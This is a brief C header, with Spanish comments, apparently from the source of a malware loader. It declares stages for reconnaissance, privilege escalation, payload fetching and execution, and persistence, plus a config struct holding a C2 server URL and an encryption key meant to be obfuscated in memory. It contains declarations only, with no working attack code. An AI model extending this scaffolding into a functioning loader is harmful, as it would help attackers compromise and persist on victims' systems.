#ifndef LOADER_H
#define LOADER_H

#include "recon.h"
#include "common.h"

// Definición de estados del loader
typedef enum {
    STAGE_RECON,
    STAGE_LPE,
    STAGE_FETCH_PAYLOAD,
    STAGE_EXEC_PAYLOAD,
    STAGE_PERSISTENCE
} loader_stage_t;

// Estructura principal de configuración (ofuscada en memoria idealmente)
typedef struct {
    char *c2_url;
    char *encryption_key;
    system_info_t sys_info;
} loader_config_t;

#endif
